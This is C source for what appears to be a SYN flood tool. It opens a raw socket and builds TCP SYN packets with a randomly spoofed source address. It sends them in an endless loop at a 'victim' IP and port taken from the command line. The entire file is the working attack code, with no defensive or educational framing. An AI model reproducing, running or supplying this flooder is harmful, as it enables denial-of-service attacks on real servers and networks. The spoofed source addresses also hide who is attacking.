#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <errno.h>

#define IP_HEADER_LEN sizeof(struct ip)
#define TCP_HEADER_LEN sizeof(struct tcphdr)

struct psdHeader {
	unsigned int srcIP;
	unsigned int destIP;
	unsigned short zero : 8;
	unsigned short proto : 8;
	unsigned short totalLen;
};

void initIPHeaderRandomIP(struct ip* header, const char* victim) {
	header->ip_v = IPVERSION;
	header->ip_hl = sizeof(struct ip) / 4;
	header->ip_tos = 0;
	header->ip_len = htons(IP_HEADER_LEN + TCP_HEADER_LEN);
	header->ip_id = 0;
	header->ip_off = 0;
	header->ip_ttl = MAXTTL;
	header->ip_p = IPPROTO_TCP;
	header->ip_sum = 0;
	header->ip_src.s_addr = random();

	inet_pton(AF_INET, victim, &header->ip_dst.s_addr);
}

void initTCPHeader(struct tcphdr* header, const char* port) {
	header->source = htons(9431);  // client TCP port is always 9431
	header->dest = htons(atoi(port));

	header->doff = sizeof(struct tcphdr) / 4;
	header->syn = 1;
	header->window = htons(4096);
	header->check = 0;
	header->seq = htonl(rand());
	header->ack_seq = 0;
}

void initPsdHeader(struct psdHeader* header, struct ip* iHeader) {
	header->srcIP = iHeader->ip_src.s_addr;
	header->destIP = iHeader->ip_dst.s_addr;

	header->zero = 0;
	header->proto = IPPROTO_TCP;
	header->totalLen = htons(0x0014);
}

unsigned short calcTCPCheckSum(const char* buf) {
	size_t size = TCP_HEADER_LEN + sizeof(struct psdHeader);
	unsigned int checkSum = 0;
	for (int i = 0; i < size; i += 2) {
		unsigned short first = (unsigned short)buf[i] << 8;
		unsigned short second = (unsigned short)buf[i + 1] & 0x00ff;
		checkSum += first + second;
	}
	while (1) {
		unsigned short c = (checkSum >> 16);
		if (c > 0) {
			checkSum = (checkSum << 16) >> 16;
			checkSum += c;
		}
		else {
			break;
		}
	}
	return ~checkSum;
}

void flood(int* socket, struct sockaddr_in address, const char* ip_addr, const char* port)
{
	for (int i = 0; 1; i++)
	{
		// 3 kinds of header
		struct tcphdr* tHeader = (struct tcphdr*)malloc(sizeof(struct tcphdr));
		memset(tHeader, 0, TCP_HEADER_LEN);
		initTCPHeader(tHeader, port);
		struct ip* iHeader = (struct ip*)malloc(sizeof(struct ip));
		memset(iHeader, 0, IP_HEADER_LEN);
		initIPHeaderRandomIP(iHeader, ip_addr);
		struct psdHeader* pHeader = (struct psdHeader*)malloc(sizeof(struct psdHeader));
		initPsdHeader(pHeader, iHeader);

		// calculate checksum
		char sumBuf[TCP_HEADER_LEN + sizeof(struct psdHeader)];
		memset(sumBuf, 0, TCP_HEADER_LEN + sizeof(struct psdHeader));
		memcpy(sumBuf, pHeader, sizeof(struct psdHeader));
		memcpy(sumBuf + sizeof(struct psdHeader), tHeader, TCP_HEADER_LEN);
		tHeader->check = htons(calcTCPCheckSum(sumBuf));

		// send TCP and IP information using a raw socket
		int totalLen = IP_HEADER_LEN + TCP_HEADER_LEN;
		char buf[totalLen];
		memcpy(buf, iHeader, IP_HEADER_LEN);
		memcpy(buf + IP_HEADER_LEN, tHeader, TCP_HEADER_LEN);
		socklen_t len = sizeof(struct sockaddr_in);
		int n = sendto(*socket, buf, totalLen, 0, (struct sockaddr*)&address, len);
		if (n < 0) {
			perror("Send Error");
		}
		printf("Write %d bytes to the server.\n", n);
	}
}

int main(int argc, char** argv) {
	if (argc != 3)
	{
		printf("please use format: %s hostname\n", argv[0]);
		exit(-1);
	}

	// construct an address
	struct sockaddr_in addr;
	memset(&addr, 0, sizeof(struct sockaddr_in));
	addr.sin_family = AF_INET;
	// addr.sin_port = htons(65535); // any port
	inet_pton(AF_INET, argv[1], &addr.sin_addr);

	// new a raw socket
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (sock < 0) {
		perror("Socket Error");
		exit(1);
	}
	const int on = 1;
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));

	flood(&sock, addr, argv[1], argv[2]);
	return 0;
}
